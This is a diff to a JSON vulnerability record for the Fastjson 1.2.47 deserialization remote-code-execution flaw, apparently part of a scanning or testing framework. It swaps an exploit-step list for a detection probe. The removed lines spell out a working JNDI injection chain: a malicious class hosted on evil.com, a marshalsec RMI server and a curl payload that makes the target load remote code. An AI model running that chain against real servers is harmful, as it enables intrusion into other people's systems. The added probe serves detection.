@@ -1,5 +1,6 @@
 {
   "vuln_id": "fastjson_1247",
+  "dispatch_skill": "fastjson_rce",
   "description": "Fastjson 1.2.47及之前版本存在反序列化漏洞，攻击者可通过特殊构造的JSON字符串绕过白名单检测，利用JNDI注入实现远程命令执行。",
   "category": "java_deserialization",
   "cves": [],
@@ -24,27 +25,27 @@
     "/"
   ],
   "detection_method": "向目标发送一个包含@type字段的JSON POST请求，观察响应是否包含fastjson相关错误信息或正常解析。例如：发送POST请求到http://{TARGET}/，Content-Type: application/json，Body: {\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}，如果响应包含fastjson解析错误或正常返回，可能表示漏洞存在。",
-  "exploit_steps": [
+  "probes": [
     {
-      "step": 1,
-      "description": "编译并上传恶意Java类文件到攻击者控制的服务器，例如TouchFile.class，用于执行命令（如touch /tmp/success）。",
-      "command": "javac TouchFile.java",
-      "expected_result": "生成TouchFile.class文件。",
-      "notes": "确保Java类文件可通过HTTP访问，例如放在http://evil.com/TouchFile.class。"
-    },
-    {
-      "step": 2,
-      "description": "使用marshalsec工具启动RMI服务器，监听指定端口（如9999），并指定加载远程恶意类。",
-      "command": "java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://evil.com/#TouchFile\" 9999",
-      "expected_result": "RMI服务器启动，监听9999端口。",
-      "notes": "需要提前下载marshalsec工具，并确保攻击机可访问evil.com域名或IP。"
-    },
-    {
-      "step": 3,
-      "description": "向目标服务器发送恶意JSON payload，触发JNDI注入，执行远程命令。",
-      "command": "curl -X POST http://{TARGET}/ -H \"Content-Type: application/json\" -d '{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://evil.com:9999/Exploit\",\"autoCommit\":true}}'",
-      "expected_result": "目标服务器连接RMI服务器，加载并执行TouchFile.class中的命令（如touch /tmp/success），在目标服务器上创建文件/tmp/success。",
-      "notes": "确保目标环境为openjdk:8u102或类似版本，没有com.sun.jndi.rmi.object.trustURLCodebase限制；evil.com需替换为实际攻击机地址。"
+      "id": "fastjson_atype_probe",
+      "description": "POST @type=java.lang.Class，观察响应错误信息",
+      "method": "POST",
+      "path": "/",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}",
+      "timeout": 10,
+      "success_signs": {
+        "body_contains_any": [
+          "fastjson",
+          "JSONException",
+          "JdbcRowSetImpl",
+          "ParseException",
+          "autoTypeSupport"
+        ]
+      },
+      "confidence": 0.85
     }
   ],
   "verification_command": "curl -X POST http://{TARGET}/ -H \"Content-Type: application/json\" -d '{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}'",
